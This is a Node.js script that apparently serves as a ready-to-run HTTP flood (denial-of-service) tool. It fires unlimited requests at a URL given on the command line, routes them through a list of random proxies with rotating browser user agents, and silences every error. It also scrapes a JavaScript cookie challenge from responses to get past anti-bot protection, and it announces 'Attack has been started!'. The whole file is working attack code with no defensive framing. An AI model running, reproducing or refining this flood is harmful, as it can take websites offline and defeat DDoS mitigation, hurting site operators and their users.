const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
const request = require('request');
const fs = require('fs');
const proxies = fs.readFileSync(process.argv[3], 'utf-8').match(/\S+/g);
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
var cookies = {};
setTimeout(() => { process.exit(1); }, process.argv[4] * 1000);
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
]

function Send() {
        var ourproxy = proxies[Math.floor(Math.random() * proxies.length)]
    request({
        method: process.argv[5],
        url: process.argv[2],
        headers: {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'accept-language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,fr;q=0.6',
            'cache-control': 'no-cache',
            cookie: cookies[ourproxy] || '',
            'pragma': 'no-cache',
            'upgrade-insecure-requests': 1,
            'user-agent': UAs[Math.floor(Math.random() * UAs.length)],
            'Connection': 'keep-alive'
        },
        gzip: true,
        proxy: 'http://' + ourproxy
    }, function(error, response, body) {
        if (body) {
            if (body.indexOf('document.cookie="') !== -1) {
                var asd = body.split('"');
                cookies[ourproxy] = response.request.headers['cookie'] + '; ' + asd[1] + ';';

                request({
                    method: process.argv[5],
                    url: asd[3],
                    headers: {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                        'accept-language': 'en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,fr;q=0.6',
                        'cache-control': 'no-cache',
                        cookie: cookies[ourproxy],
                        'pragma': 'no-cache',
                        'upgrade-insecure-requests': 1,
                        'user-agent': UAs[Math.floor(Math.random() * UAs.length)],
                        'Connection': 'keep-alive'
                    },
                    gzip: true,
                    proxy: 'http://' + ourproxy
                })
            }
        }
    });
}
setInterval(() => { Send(); });
console.log("Attack has been started!")